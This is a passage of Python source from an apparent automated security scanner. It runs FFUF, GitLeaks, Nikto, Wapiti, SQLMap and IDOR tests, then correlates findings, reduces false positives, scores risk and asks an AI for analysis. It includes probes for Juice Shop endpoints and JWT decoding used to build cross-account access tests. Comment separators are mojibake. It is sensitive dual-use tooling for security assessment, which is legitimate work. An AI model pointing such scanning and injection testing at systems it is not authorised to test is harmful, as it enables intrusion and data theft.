                     f"[P3] Lab challenges: {lab_challenges_result.get('total', 0)} challenge(s) "
                     f"detectes via {lab_challenges_result.get('platform')}",
                     level="warning")
            for ch in lab_challenges_result.get("challenges", [])[:10]:
                _add_log(db, scan_id,
                         f"  [CHALLENGE] {ch.get('name')} "
                         f"(difficulty={ch.get('difficulty', 0)}, category={ch.get('category', 'lab')})",
                         level="warning")
        elif lab_challenges_result.get("error"):
            _add_log(db, scan_id,
                     f"[P3] Lab challenge detection: {lab_challenges_result['error']}",
                     level="info")
        ctx.save_step_result("lab_challenges", lab_challenges_result)

        # Log FFUF
        if ffuf_result.get("error"):
            _add_log(db, scan_id, f"[P3] FFUF error: {ffuf_result['error']}", level="error")
        else:
            ep_total  = ffuf_result.get("total", 0)
            by_cat    = ffuf_result.get("by_category", {})
            sensitive = by_cat.get("sensitive", 0)
            _add_log(db, scan_id,
                     f"[P3] FFUF: {ep_total} endpoints discovered"
                     + (f" | {sensitive} sensitive paths" if sensitive else ""),
                     level="warning" if sensitive > 0 else "info")
            for ep in ffuf_result.get("categorized", {}).get("sensitive", [])[:5]:
                _add_log(db, scan_id,
                         f"  [SENSITIVE] {ep.get('url')} [{ep.get('status')}]", level="warning")
        ctx.save_step_result("ffuf", ffuf_result)
        _update_scan(db, scan, ffuf_data=ffuf_result, progress=64)

        # Log GitLeaks
        if gitleaks_result.get("error"):
            _add_log(db, scan_id, f"[P3] GitLeaks error: {gitleaks_result['error']}", level="error")
        else:
            secrets_total = gitleaks_result.get("total", 0)
            by_sev_gl     = gitleaks_result.get("by_severity", {})
            _add_log(db, scan_id,
                     f"[P3] GitLeaks: {secrets_total} secret(s) detected"
                     + (f" | critical={by_sev_gl.get('critical', 0)} high={by_sev_gl.get('high', 0)}"
                        if secrets_total else ""),
                     level=("error"   if by_sev_gl.get("critical", 0) > 0 else
                            "warning" if secrets_total > 0 else "info"))
            for leak in gitleaks_result.get("findings", [])[:3]:
                _add_log(db, scan_id,
                         f"  [SECRET] {leak.get('rule_id')} in {leak.get('file', '?')}",
                         level="error" if leak.get("severity") == "critical" else "warning")
        ctx.save_step_result("gitleaks", gitleaks_result)
        _update_scan(db, scan, gitleaks_data=gitleaks_result, progress=70)

        # Log Nikto
        if nikto_result.get("skipped"):
            _add_log(db, scan_id,
                     f"[P3] Nikto: SKIPPED  --  {nikto_result.get('reason', 'agent decision')}")
        elif nikto_result.get("error"):
            _add_log(db, scan_id, f"[P3] Nikto error: {nikto_result['error']}", level="error")
        else:
            _nikto_total = nikto_result.get("total", 0)
            _nikto_sev   = nikto_result.get("by_severity", {})
            _add_log(db, scan_id,
                     f"[P3] Nikto: {_nikto_total} finding(s)"
                     + (f" | critical={_nikto_sev.get('critical', 0)} high={_nikto_sev.get('high', 0)}"
                        if _nikto_total else ""),
                     level=("error"   if _nikto_sev.get("critical", 0) > 0 else
                            "warning" if _nikto_sev.get("high",     0) > 0 else "info"))
        ctx.save_step_result("nikto", nikto_result)

        # Log Wapiti
        if wapiti_result.get("skipped"):
            _add_log(db, scan_id,
                     f"[P3] Wapiti: SKIPPED  --  {wapiti_result.get('reason', 'agent decision')}")
        elif wapiti_result.get("error"):
            _add_log(db, scan_id, f"[P3] Wapiti error: {wapiti_result['error']}", level="error")
        else:
            _wapiti_total = wapiti_result.get("total", 0)
            _wapiti_sev   = wapiti_result.get("by_severity", {})
            _wapiti_scope = wapiti_result.get("scope", "domain")
            _add_log(db, scan_id,
                     f"[P3] Wapiti: {_wapiti_total} finding(s) | scope={_wapiti_scope}"
                     + (f" | critical={_wapiti_sev.get('critical', 0)} high={_wapiti_sev.get('high', 0)}"
                        if _wapiti_total else ""),
                     level=("error"   if _wapiti_sev.get("critical", 0) > 0 else
                            "warning" if _wapiti_sev.get("high",     0) > 0 else "info"))
        ctx.save_step_result("wapiti", wapiti_result)

        # a"EURa"EUR Step 3b: SQLMap  --  conditionnel (params GET/POST detectes ZAP + FFUF + Katana) a"EUR
        from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs

        # Endpoints ZAP avec query string (GET) ou form params (POST)
        zap_get_param_eps = [
            ep.get("url", "") for ep in zap_result.get("endpoints", [])[:50]
            if _parse_qs(_urlparse(ep.get("url", "")).query)
        ]
        zap_form_params = zap_result.get("form_params", [])

        # Endpoints FFUF porteurs de parametres GET (?x=y)
        ffuf_get_param_eps = [
            ep.get("url", "") for ep in ffuf_result.get("endpoints", [])[:80]
            if ep.get("url") and _parse_qs(_urlparse(ep.get("url", "")).query)
        ]
        
        # Endpoints Katana avec parametres (suite a la modif de main.py de Katana)
        katana_param_eps = katana_result.get("urls_with_params", [])

        # Declenchement si ZAP, FFUF OU Katana a detecte des parametres injectables.
        has_injectable_params = bool(
            zap_form_params or zap_get_param_eps or ffuf_get_param_eps or katana_param_eps
        )

        # a"EURa"EUR Fallback parametre : si aucun param detecte (SPA, app PHP sans crawler),
        # on sonde des endpoints GET parametres connus et on les injecte dans FFUF
        # pour que _call_sqlmap_enriched les teste.
        if not has_injectable_params:
            _base_url = target if target.startswith(("http://", "https://")) else f"http://{target}"
            _base_url  = _base_url.rstrip("/")
            # Attendre que la cible recupere apres Nikto/Wapiti (scans lourds)
            loop.run_until_complete(_wait_for_target(target, max_retries=4))
            # Sonde les endpoints parametres connus (Juice Shop, DVWA, BWAPP, apps generiques).
            _param_probes = [
                (f"{_base_url}/rest/products/search",         "?q=test",       "Juice-Shop-REST"),
                (f"{_base_url}/api/Products",                 "?q=test",       "Juice-Shop-Products"),
            ]
            async def _probe_param_endpoints():
                found = []
                async with httpx.AsyncClient(timeout=10.0, verify=False,
                                             follow_redirects=True) as _c:
                    for _path, _qs, _label in _param_probes:
                        try:
                            _r = await _c.get(f"{_path}{_qs}")
                            if _r.status_code in (200, 302, 400, 401, 403, 500):
                                found.append((_path, _qs, _label, _r.status_code))
                        except Exception:
                            pass
                return found
            _probed = loop.run_until_complete(_probe_param_endpoints())
            for _path, _qs, _label, _sc in _probed:
                ffuf_result.setdefault("endpoints", []).append(
                    {"url": f"{_path}{_qs}", "status": _sc}
                )
                has_injectable_params = True
                _add_log(db, scan_id,
                         f"[P3] SQLMap fallback probe {_label} (HTTP {_sc})  --  endpoint found, SQLMap triggered",
                         level="info")

        has_injectable_params = True  # FIX G: auth-bypass probe always provides /rest/user/login

        # Fix 2 Groupe B: SQLMap + IDOR en parallele (les deux dependent des resultats Groupe A)
        # Collect IDOR endpoints first (synchronous, fast) before launching parallel group
        _idor_eps_pre: List[str] = []
        for _ep in ffuf_result.get("endpoints", []):
            _u = _ep.get("url", "") if isinstance(_ep, dict) else str(_ep)
            if _u:
                _idor_eps_pre.append(_u)
        for _ep in katana_result.get("api_endpoints", []):
            _u = _ep.get("url", "") if isinstance(_ep, dict) else str(_ep)
            if _u:
                _idor_eps_pre.append(_u)
        for _ep in katana_result.get("endpoints", []):
            _u = _ep.get("url", "") if isinstance(_ep, dict) else str(_ep)
            if _u:
                _idor_eps_pre.append(_u)
        _seen_pre: set = set()
        _idor_eps_dedup: List[str] = []
        for _u in _idor_eps_pre:
            if _u not in _seen_pre:
                _seen_pre.add(_u)
                _idor_eps_dedup.append(_u)

        _sqlmap_skip_agent = {
            "target": target, "skipped": True,
            "reason": agent_decision["reasons"].get("sqlmap", "skipped by agent decision"),
            "vulnerable": False, "findings": [], "total": 0,
        }
        _sqlmap_skip_noparams = {
            "target": target, "skipped": True,
            "reason": "No injectable GET/POST params detected -- SQLMap skipped (FP reduction)",
            "vulnerable": False, "findings": [], "total": 0,
        }
        _idor_skip_default: Dict[str, Any] = {
            "target": target, "skipped": True, "reason": "no_auth",
            "findings": [], "total": 0, "by_severity": {},
            "user_b_email": None, "user_b_id": None, "candidates_tested": 0, "error": None,
        }

        if "sqlmap" in tools_to_run:
            _add_log(db, scan_id,
                     f"[P3] SQLMap+IDOR parallel -- ZAP: {len(zap_get_param_eps)} GET eps, "
                     f"{len(zap_form_params)} form params | "
                     f"FFUF/Katana: {len(ffuf_get_param_eps) + len(katana_param_eps)} eps avec params. "
                     f"auth={'oui' if (_auth_h or _auth_c) else 'non'}")
        if auth_ctx.has_auth():
            _add_log(db, scan_id, "[P3] IDOR: lancement du test cross-compte (parallel avec SQLMap)...")

        async def _do_phase3b():
            async def _p3b_sqlmap():
                if "sqlmap" not in tools_to_run:
                    return _sqlmap_skip_agent
                # Use the outer has_injectable_params which includes fallback probes
                # and the auth-bypass override (line above). Do NOT recalculate from
                # the stale pre-probe lists (zap_get_param_eps etc.) — they are empty
                # for SPAs like Juice Shop even after fallback probes mutated ffuf_result.
                if not has_injectable_params:
                    _add_log(db, scan_id,
                             "[P3] SQLMap: SKIPPED -- no injectable parameters detected (saved ~5min)",
                             level="info")
                    return _sqlmap_skip_noparams
                await _wait_for_target(target)
                return await _call_sqlmap_enriched(
                    target, zap_result, ffuf_result, katana_result,
                    timeout=300, auth_headers=_auth_h, auth_cookies=_auth_c,
                    probe_pack_ids=agent_decision.get("probe_pack_ids") or ["generic_rest_api"],
                )

            async def _p3b_idor():
                if not auth_ctx.has_auth():
                    return _idor_skip_default
                # Extract user_a_id from pipeline JWT so IDOR can build delta candidates
                _idor_user_a_id: Optional[int] = None
                _idor_user_a_email: Optional[str] = None
                _raw_jwt = (_auth_h or {}).get("Authorization", "")
                if _raw_jwt:
                    _jwt_part = _raw_jwt.split(" ", 1)
                    _tok = _jwt_part[1] if len(_jwt_part) == 2 else _raw_jwt
                    try:
                        import base64 as _b64, json as _json
                        _parts = _tok.split(".")
                        if len(_parts) == 3:
                            _pad = 4 - len(_parts[1]) % 4
                            _pl = _json.loads(_b64.urlsafe_b64decode(_parts[1] + "=" * _pad))
                            _idor_user_a_id = _pl.get("data", {}).get("id") if isinstance(_pl.get("data"), dict) else None
                            _idor_user_a_email = _pl.get("data", {}).get("email") if isinstance(_pl.get("data"), dict) else None
                    except Exception:
                        pass
                try:
                    return await asyncio.wait_for(
                        _call_idor(
                            target,
                            endpoints=_idor_eps_dedup[:40],
                            timeout=90,
                            auth_headers=_auth_h or None,
                            auth_cookies=_auth_c or None,
                            user_a_id=_idor_user_a_id,
                            user_a_email=_idor_user_a_email,
                        ),
                        timeout=120,
                    )
                except asyncio.TimeoutError:
                    return {**_idor_skip_default, "skipped": True, "reason": "idor_timeout",
                            "error": "IDOR test timed out"}
                except Exception as _ex:
                    return {**_idor_skip_default, "skipped": True, "error": str(_ex)}

            # Sequentiel : SQLMap d'abord, puis IDOR -- evite contention HTTP sur memes endpoints
            try:
                _sql = await _p3b_sqlmap()
            except Exception as _e_sql:
                _sql = {**_sqlmap_skip_agent, "error": str(_e_sql)}
            try:
                _idr = await _p3b_idor()
            except Exception as _e_idr:
                _idr = {**_idor_skip_default, "error": str(_e_idr)}
            return _sql, _idr

        sqlmap_result, idor_result = loop.run_until_complete(
            asyncio.wait_for(_do_phase3b(), timeout=380)
        )

        # Log SQLMap
        if sqlmap_result.get("skipped"):
            _add_log(db, scan_id,
                     f"[P3] SQLMap: SKIPPED -- {sqlmap_result.get('reason', 'agent decision')}",
                     level="info")
        elif sqlmap_result.get("error"):
            _add_log(db, scan_id, f"[P3] SQLMap error: {sqlmap_result['error']}", level="error")
        else:
            vulnerable        = sqlmap_result.get("vulnerable", False)
            sqli_total        = sqlmap_result.get("total", 0)
            targets_tested    = sqlmap_result.get("targets_tested", 0)
            _sql_api_fallback = sqlmap_result.get("api_fallback", False)
            _add_log(db, scan_id,
                     f"[P3] SQLMap: {targets_tested} targets tested | api_fallback={_sql_api_fallback}  --  "
                     + ("VULNERABLE  --  " + str(sqli_total) + " injection(s) found"
                        if vulnerable else "No SQL injection detected"),
                     level="error" if vulnerable else "info")
            for f in sqlmap_result.get("findings", [])[:3]:
                _add_log(db, scan_id,
                         f"  [SQLI] Param: {f.get('parameter')} | "
                         f"{f.get('technique')} | {f.get('target_url', '')[:60]}",
                         level="error")

        # Log IDOR
        idor_total = idor_result.get("total", 0)
        if idor_result.get("skipped"):
            _add_log(db, scan_id,
                     f"[P3] IDOR: skipped -- {idor_result.get('reason', 'unknown')}",
                     level="info")
        elif idor_total > 0:
            _add_log(db, scan_id,
                     f"[P3] IDOR: {idor_total} vulnerability(ies) confirmed -- "
                     f"cross-account data leak detected",
                     level="warning")
        else:
            _add_log(db, scan_id,
                     f"[P3] IDOR: {idor_result.get('candidates_tested', 0)} URL(s) tested -- "
                     f"no cross-account access confirmed",
                     level="info")

        ctx.save_step_result("idor", idor_result)
        ctx.save_step_result("sqlmap", sqlmap_result)

        # P3: Extended probes deep -- needs FFUF/Katana discovered URLs
        _katana_urls = [
            e.get("url", "") if isinstance(e, dict) else str(e)
            for e in katana_result.get("endpoints", [])
        ]
        _ffuf_urls = [
            e.get("url", "") if isinstance(e, dict) else str(e)
            for e in ffuf_result.get("endpoints", [])
        ]
        _all_disc_urls = list(set(u for u in _katana_urls + _ffuf_urls if u))
        if _all_disc_urls:
            _add_log(db, scan_id,
                     f"[P3] Extended probes deep: running 4 probes on {len(_all_disc_urls)} endpoints")
            try:
                _deep_result = loop.run_until_complete(
                    asyncio.wait_for(
                        _p3_extended_probes_deep(target, auth_ctx, _all_disc_urls),
                        timeout=120,
                    )
                )
                _add_log(db, scan_id,
                         f"[P3] Extended probes deep: "
                         f"{len(_deep_result.get('findings', []))} findings",
                         level="info")
                if _deep_result.get("findings"):
                    dalfox_result.setdefault("findings", []).extend(_deep_result["findings"])
                    dalfox_result["total"] = len(dalfox_result.get("findings", []))
            except asyncio.TimeoutError:
                _add_log(db, scan_id, "[P3] Extended probes deep: TIMEOUT 120s", level="warning")
            except Exception as _edp_exc:
                _add_log(db, scan_id,
                         f"[P3] Extended probes deep error: {_edp_exc}", level="warning")
        else:
            _add_log(db, scan_id,
                     "[P3] Extended probes deep: SKIPPED -- no endpoints",
                     level="warning")

        _update_scan(db, scan, progress=75)
        _publish(r, scan_id, "running", 75, "Phase 3/5  --  Exploitation complete [OK]")
        _add_log(db, scan_id, "Phase 3/5 complete [OK]")

        # a"EURa"EUR Detection cible indisponible  --  si tous les outils actifs P2+P3 ont echoue
        _p23_results = {
            n: r for n, r in [
                ("ffuf",     ffuf_result),
                ("nuclei",   nuclei_result),
                ("zap",      zap_result),
                ("nikto",    nikto_result),
                ("wapiti",   wapiti_result),
                ("gitleaks", gitleaks_result),
            ]
            if n in tools_to_run and not r.get("skipped")
        }
        _all_tools_failed = bool(_p23_results) and all(
            r.get("error") for r in _p23_results.values()
        )
        if _all_tools_failed:
            _unavail_msg = (
                "[SCAN] Cible non disponible pendant le scan  --  resultats incomplets. "
                f"Tous les outils actifs ont echoue : {list(_p23_results.keys())}"
            )
            logger.warning(
                " ALL active tools failed for %s  --  target likely overloaded or down. "
                "Tools: %s | Errors: %s",
                target,
                list(_p23_results.keys()),
                {n: (r.get("error") or "")[:60] for n, r in _p23_results.items()},
            )
            _add_log(db, scan_id, _unavail_msg, level="warning")
            _update_scan(db, scan, error_message=_unavail_msg)

        # a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
        # PHASE 4  --  CORRELATION ENGINE  (75 -> 90%)
        # Sequential: Correlator -> FP Reduction -> Risk Scoring
        # a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
        _update_scan(db, scan, current_phase="correlation", progress=77)
        _publish(r, scan_id, "running", 77,
                 "[Phase 4/5] Correlation  --  dedup + FP reduction + risk scoring...")
        _add_log(db, scan_id,
                 "a*a*a* Phase 4/5: Correlation Engine (dedup + FP reduction + risk scoring) a*a*a*")

        # a"EURa"EUR 4a: Correlation a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
        _add_log(db, scan_id, "[P4] Correlation de tous les findings des phases 1-3...")
        correlation_report: Dict[str, Any] = {}
        try:
            dalfox_findings = dalfox_result.get("findings", [])
            nuclei_for_corr = dict(nuclei_result)
            if dalfox_findings:
                existing_findings = list(nuclei_for_corr.get("findings", []))
                for df in dalfox_findings:
                    existing_findings.append({
                        "name":             df.get("title", "XSS"),
                        "severity":         df.get("severity", "high"),
                        "cve_ids":          df.get("cve_ids", []),
                        "cwe_ids":          df.get("cwe_ids", ["CWE-79"]),
                        "cvss_score":       None,
                        "matched_at":       df.get("url", target),
                        "tags":             df.get("tags", []),
                        "sources":          [df.get("source", "dalfox")],
                        "confidence_score": 0.88,
                    })
                nuclei_for_corr["findings"] = existing_findings

            correlation_report = correlate(
                nmap_data    = nmap_result,
                zap_data     = zap_result,
                nuclei_data  = nuclei_for_corr,
                shodan_data  = shodan_result,
                vt_data      = vt_result,
                abuse_data   = abuse_result,
                ffuf_data    = ffuf_result,
                katana_data  = katana_result,
                lab_challenges_data = lab_challenges_result,
                nikto_data   = nikto_result,
                wapiti_data  = wapiti_result,
                sqlmap_data  = sqlmap_result,
                idor_data    = idor_result,
            )
            summary_str = correlation_report.get("summary", "")
            _add_log(db, scan_id, f"[P4] Correlation: {summary_str}")

            svm = correlation_report.get("service_vuln_map", {})
            if svm:
                _add_log(db, scan_id, f"  Service->CVE map: {len(svm)} service(s) avec CVEs connus")
            for ap in correlation_report.get("attack_paths", [])[:5]:
                _add_log(db, scan_id, f"  [PATH] {ap}", level="warning")

        except Exception as exc:
            correlation_report = {"error": str(exc), "correlated_findings": []}
            _add_log(db, scan_id, f"[P4] Correlation Engine error: {exc}", level="error")
            logger.exception("Correlation Engine failed for %s", target)

        ctx.save_step_result("correlation", correlation_report)
        _update_scan(db, scan, correlated_data=correlation_report, progress=80)

        # a"EURa"EUR 4b: FP Reduction a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
        _add_log(db, scan_id, "[P4] Classification FP (confirmed / suspicious / informational)...")
        fp_report: Dict[str, Any] = {}
        try:
            from app.fp_engine import reduce_false_positives
            from app.correlation_engine.correlator import _build_nmap_service_map
            import re as _re
            import ipaddress as _ipaddress

            service_map  = _build_nmap_service_map(nmap_result)
            raw_findings = correlation_report.get("correlated_findings", [])

            _target_host = _re.sub(r"^https?://", "", target).split("/")[0].split(":")[0]
            _is_internal = False
            try:
                _ip = _ipaddress.ip_address(_target_host)
                _is_internal = _ip.is_private or _ip.is_loopback
            except ValueError:
                _is_internal = "." not in _target_host or _target_host == "localhost"

            fp_report = reduce_false_positives(
                findings    = raw_findings,
                service_map = service_map,
                config      = {
                    "ignore_low_confidence": (
                        False if _is_internal else settings.FP_IGNORE_LOW_CONFIDENCE
                    ),
                    "require_active_source_for_medium_plus": (
                        False if _is_internal else settings.FP_REQUIRE_ACTIVE_SOURCE
                    ),
                },
                lab_mode    = lab_mode,
            )

            correlation_report["correlated_findings"] = fp_report["filtered_findings"]
            correlation_report["fp_reduction"] = {
                "original_count":    fp_report["original_count"],
                "final_count":       fp_report["final_count"],
                "merged_total":      fp_report.get("merged_total", 0),
                "removed_total":     fp_report.get("merged_total", 0),
                "removed_by_layer":  fp_report["removed_by_layer"],
                "fp_reduction_rate": fp_report["fp_reduction_rate"],
                "by_tier":           fp_report.get("by_tier", {}),
                "confirmed":         len(fp_report.get("confirmed", [])),
                "suspicious":        len(fp_report.get("suspicious", [])),
                "informational":     len(fp_report.get("informational", [])),
            }

            by_sev_fp: Dict[str, int] = {}
            for f in fp_report["filtered_findings"]:
                sev = f.get("severity", "info")
                by_sev_fp[sev] = by_sev_fp.get(sev, 0) + 1
            correlation_report["by_severity"]    = by_sev_fp
            correlation_report["total_findings"] = fp_report["final_count"]

            by_tier = fp_report.get("by_tier", {})
            _add_log(db, scan_id,
                     f"[P4] FP Classification: {fp_report['summary']}"
                     + (" [lab mode]" if _is_internal else ""),
                     level="info")
            _add_log(db, scan_id,
                     f"  Tiers: confirmed={by_tier.get('confirmed', 0)} "
                     f"suspicious={by_tier.get('suspicious', 0)} "
                     f"informational={by_tier.get('informational', 0)} "
                     f"| merged={fp_report.get('merged_total', 0)}")
            for f in fp_report.get("suspicious", [])[:3]:
                _add_log(db, scan_id,
                         f"  [SUSPICIOUS] {f.get('title', '?')}  --  flags: {f.get('fp_flags', [])}",
                         level="warning")

        except Exception as exc:
            fp_report = {"error": str(exc)}
            _add_log(db, scan_id, f"[P4] FP Reduction error: {exc}", level="error")
            logger.exception("FP Reduction failed for %s", target)

        ctx.save_step_result("fp_reduction", fp_report)
        _update_scan(db, scan, correlated_data=correlation_report, progress=84)

        # a"EURa"EUR 4c: Risk Scoring a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
        _add_log(db, scan_id, "[P4] Calcul du risk score multi-facteurs...")
        _nuclei_for_score = ctx.get_step_result("nuclei") or {}
        if str(_nuclei_for_score.get("error", "")).startswith("Nuclei timeout after"):
            _add_log(db, scan_id,
                     "[P4] Nuclei timeout -- using neutral score 50 instead of 0",
                     level="info")
        risk_report = compute_enhanced_risk_score(ctx, correlation_report)
        risk_score  = risk_report["final_score"]

        # a"EURa"EUR Fix 6: score minimum garanti a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
        # Plancher de score selon la severite correlee et le nombre de CVE Shodan
        # connues. Garantit qu'une cible avec des findings reels n'est jamais
        # sous-evaluee. Generique  --  aucune cible en dur.
        _corr_sev    = correlation_report.get("by_severity", {})
        _shodan_cves = len(
            shodan_result.get("data", {}).get("internetdb", {}).get("vulns", [])
        )
        _min_score = 0
        if _corr_sev.get("medium", 0) >= 1:
            _min_score = max(_min_score, 20)
        if _corr_sev.get("high", 0) >= 1:
            _min_score = max(_min_score, 40)
        if _corr_sev.get("critical", 0) >= 1:
            _min_score = max(_min_score, 70)
        if _shodan_cves > 50:
            _min_score = max(_min_score, 35)
        if _shodan_cves > 100:
            _min_score = max(_min_score, 50)

        if _min_score > risk_score:
            _add_log(db, scan_id,
                     f"[P4] Score minimum garanti: {risk_score} -> {_min_score} "
                     f"(medium={_corr_sev.get('medium', 0)}, high={_corr_sev.get('high', 0)}, "
                     f"shodan_cves={_shodan_cves})",
                     level="info")
            risk_score = _min_score
            risk_report["final_score"] = _min_score

        components  = risk_report.get("component_scores", {})
        _add_log(db, scan_id,
                 f"[P4] Risk Score: {risk_score}/100 | "
                 f"nuclei={components.get('nuclei_cve', 0):.0f} "
                 f"zap={components.get('zap_web', 0):.0f} "
                 f"exploit={components.get('exploitability', 0):.0f} "
                 f"port={components.get('port_exposure', 0):.0f}",
                 level="error" if risk_score >= 70 else "warning" if risk_score >= 40 else "info")
        _add_log(db, scan_id,
                 f"  Exploitability: {risk_report.get('exploitability_score', 0):.0f}/100 | "
                 f"Confidence: {risk_report.get('confidence_score', 0):.0f}% | "
                 f"Threat Intel: {risk_report.get('threat_intelligence_factor', 0):.0f}/100")

        _update_scan(db, scan, progress=90)
        _publish(r, scan_id, "running", 90,
                 f"Phase 4/5  --  Correlation complete [OK] (risk={risk_score}/100)")
        _add_log(db, scan_id, "Phase 4/5 complete [OK]")

        # a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
        # PHASE 5  --  SOC DASHBOARD  (90 -> 100%)
        # AI Analysis (optional) + SOC Report final + recommandations
        # a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
        _update_scan(db, scan, current_phase="soc_dashboard", progress=92)
        _publish(r, scan_id, "running", 92,
                 "[Phase 5/5] SOC Dashboard  --  top findings + rapport + recommandations...")
        _add_log(db, scan_id,
                 "a*a*a* Phase 5/5: SOC Dashboard (top findings + rapport + recommandations) a*a*a*")

        # a"EURa"EUR AI Analysis a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
        # Regle : ne jamais retourner N/A si findings > 0 ou risk_score > 0.
        # Si Gemini est indisponible/desactive -> fallback rule-based.
        ai_result: Dict[str, Any] = {}
        _gemini_key    = settings.GEMINI_API_KEY
        _anthropic_key = settings.ANTHROPIC_API_KEY
        _ai_key        = _gemini_key or _anthropic_key
        _ai_provider   = "gemini" if _gemini_key else "anthropic"
        _total_findings = correlation_report.get("total_findings", 0)

        # SOC report est deja construit plus bas, on le passe vide au fallback
        # s'il n'est pas encore disponible  --  il sera complete apres.
        _soc_for_fallback: Dict[str, Any] = {}

        if settings.AI_ANALYSIS_ENABLED and _ai_key:
            try:
                from app.services.ai_service import analyze_with_ai
                _all_findings  = correlation_report.get("correlated_findings", [])
                _confirmed_f   = [f for f in _all_findings if f.get("fp_status") == "confirmed"]
                _suspicious_f  = [f for f in _all_findings if f.get("fp_status") == "suspicious"]
                _ffuf_by_sev   = ffuf_result.get("by_severity", {})
                _sensitive_eps = (
                    _ffuf_by_sev.get("critical", []) + _ffuf_by_sev.get("high", [])
                ) or ffuf_result.get("categorized", {}).get("sensitive", [])
                _auth_eps      = _ffuf_by_sev.get("medium", [])
                _nmap_services = nmap_result.get("summary", {}).get("services", {})

                scan_summary = {
                    "correlated_findings":   _all_findings,
                    "confirmed_findings":    _confirmed_f,
                    "suspicious_findings":   _suspicious_f,
                    "risk_score":            risk_score,
                    "risk_components":       risk_report.get("component_scores", {}),
                    "open_ports":            nmap_result.get("summary", {}).get("ports", []),
                    "nmap_services":         _nmap_services,
                    "cdn_providers":         nmap_result.get("summary", {}).get("cdn_providers", []),
                    "tech_stack":            nuclei_ctx.get("tech_stack", []) or subfinder_result.get("technologies", []),
                    "zap_alerts":            zap_result.get("alerts", []),
                    "abnormal_headers":      zap_result.get("abnormal_headers", []),
                    "sqli_findings":         sqlmap_result.get("findings", []),
                    "xss_findings":          dalfox_result.get("findings", []),
                    "nuclei_findings":       nuclei_result.get("findings", []),
                    "endpoints_discovered":  ffuf_result.get("endpoints", []),
                    "sensitive_endpoints":   _sensitive_eps,
                    "auth_endpoints":        _auth_eps,
                    "api_endpoints":         katana_result.get("api_endpoints", []),
                    "endpoint_risk_ranking": correlation_report.get("endpoint_risk_ranking", []),
                    "secrets_found":         gitleaks_result.get("findings", []),
                    "vt_malicious":          vt_result.get("data", {}).get("malicious", 0),
                    "abuse_confidence":      abuse_result.get("data", {}).get("abuse_confidence_score", 0),
                    "attack_paths":          correlation_report.get("attack_paths", []),
                }

                raw_ai = loop.run_until_complete(
                    analyze_with_ai(target, scan_summary, _ai_key,
                                    model=settings.AI_MODEL, provider=_ai_provider)
                )

                # Si l'IA retourne une erreur ou manque risk_level -> fallback
                if raw_ai.get("error") or not raw_ai.get("risk_level"):
                    _reason = raw_ai.get("error", "missing risk_level in AI response")
                    _add_log(db, scan_id,
                             f"[P5] AI response incomplete ({_reason[:80]})  --  fallback active",
                             level="warning")
                    ai_result = _build_fallback_ai_analysis(
                        target, risk_score, correlation_report, _soc_for_fallback, reason=_reason
                    )
                    ai_result["ai_raw_error"] = _reason
                else:
                    ai_result = raw_ai
                    _add_log(db, scan_id,
                             f"[P5] AI ({_ai_provider}/{ai_result.get('model_used', '?')}): "
                             f"{ai_result.get('risk_level')}  --  "
                             f"{ai_result.get('executive_summary', '')[:100]}",
                             level="info")

            except Exception as exc:
                _add_log(db, scan_id, f"[P5] AI exception: {exc}  --  fallback active", level="warning")
                ai_result = _build_fallback_ai_analysis(
                    target, risk_score, correlation_report, _soc_for_fallback, reason=str(exc)
                )
                ai_result["ai_exception"] = str(exc)
        else:
            # AI desactive ou pas de cle  --  fallback si findings ou score > 0
            if _total_findings > 0 or risk_score > 0:
                _add_log(db, scan_id,
                         "[P5] AI desactive -> generation analyse rule-based (findings trouves)",
                         level="info")
                ai_result = _build_fallback_ai_analysis(
